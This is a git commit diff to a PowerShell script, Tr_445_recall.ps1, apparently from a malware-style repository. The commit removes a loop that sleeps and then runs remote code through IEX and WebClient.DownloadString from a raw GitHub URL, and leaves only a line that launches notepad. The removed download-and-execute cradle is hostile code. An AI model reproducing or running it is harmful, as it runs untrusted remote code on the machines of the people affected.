982306a680d9ea0f92e94eaec44f00b553e6bda1
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2024-01-27 13:03:59 +0600

    Update Tr_445_recall.ps1
    test

--- Tr_445_recall.ps1
+++ Tr_445_recall.ps1
@@ -1,10 +1,1 @@
-$processes = Get-Process
-
-$i = 1
-ForEach ($process in $processes) {
-
-    Start-Sleep -Seconds 20
-    IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_445_server.ps1')
-    $i++
-   
-}
+notepad;
